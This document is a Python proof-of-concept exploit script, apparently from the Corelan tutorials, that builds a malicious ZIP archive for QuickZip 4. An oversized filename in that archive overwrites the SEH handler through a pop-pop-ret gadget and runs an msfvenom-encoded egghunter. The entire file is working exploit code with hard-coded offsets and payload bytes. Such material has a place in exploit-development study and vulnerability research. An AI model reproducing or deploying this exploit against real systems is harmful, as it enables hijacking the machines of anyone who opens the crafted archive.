#!/usr/bin/env python

# Original Author : corelanc0d3r
# Python POC Author: d3c3pt10n
# http://www.corelan.be:8800
#
# Original: March 2010
# Updated: October 2018

from struct import pack
from os import remove
from sys import exit


filename = "corelanboom.zip"
target_len = 4068
nseh_offset = 294
seh_offset = 298

ldf_header = (
    "\x50\x4B\x03\x04\x14\x00\x00"
    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00"
)

cdf_header = (
    "\x50\x4B\x01\x02\x14\x00\x14"
    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00\x00\x00\x00\x01\x00"
    "\x24\x00\x00\x00\x00\x00\x00\x00"
)

eofcdf_header = (
    "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    "\x12\x10\x00\x00"  # Size of central directory (bytes)
    "\x02\x10\x00\x00"  # Offset of start of central directory,
    # relative to start of archive
    "\x00\x00"
)

# msfvenom -p generic/custom PAYLOADFILE=egghunter.bin -e x86/alpha_mixed
# BufferRegister=EDX -a x86 --platform Windows
# Payload size: 117 bytes
encoded_egghunter = (
    "JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI2FmQIZYoFoPB0Rpj321HhMfNUl4ERz"
    "bTzOOHPwp0FPCDLK8zlo3ExjloBUIwYom7AA"
)
egghunter_len = len(encoded_egghunter)  # should be 117!
if egghunter_len != 117:
    print(
        "[!] Egghunter length was {current_len}, expected 117 bytes".format(
            current_len=len(encoded_egghunter)
        )
    )
    exit(1)

# 9F gets mangled into 83 giving us a -125 byte jump
nseh = "\x71\x9F\x70\x9F"
# Message=  0x00435133 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii,
# alphanum,uppernum {PAGE_EXECUTE_READ} [QuickZip.exe] ASLR: False, Rebase: False,
# SafeSEH: False, OS: False, v-1.0- (C:\Program Files\QuickZip4\QuickZip.exe)
seh = pack("<L", 0x00435133)
file_extension = ".txt"

payload = "A" * 27
payload += encoded_egghunter
payload += "A" * 27
payload += "B" * 123
if len(payload) != nseh_offset:
    print(
        "[!] nSEH offset is {cur_offset}, expected {exp_offset}".format(
            cur_offset=len(payload), exp_offset=nseh_offset
        )
    )
    exit(1)
payload += nseh
if len(payload) != seh_offset:
    print(
        "[!] SEH offset is {cur_offset}, expected {exp_offset}".format(
            cur_offset=len(payload), exp_offset=seh_offset
        )
    )
    exit(1)
payload += seh
payload += "D" * (target_len - len(payload) - len(file_extension))
payload += file_extension
payload_len = len(payload)

if payload_len != 4068:
    print(
        "[!] Filename payload is length {payload_len}, expected {target_len}".format(
            payload_len=payload_len, target_len=target_len
        )
    )
    exit(1)

print("[*] Size : {length} bytes".format(length=payload_len))
print("[*] Removing old {filename} file".format(filename=filename))
try:
    remove(filename)
except OSError:
    print("[!] Couldn't remove, probably doesn't exist. Ignoring this error")
    pass
print("[*] Creating new {filename} file".format(filename=filename))
with open(filename, "w") as f:
    file_content = ldf_header + payload + cdf_header + payload + eofcdf_header
    f.write(file_content)
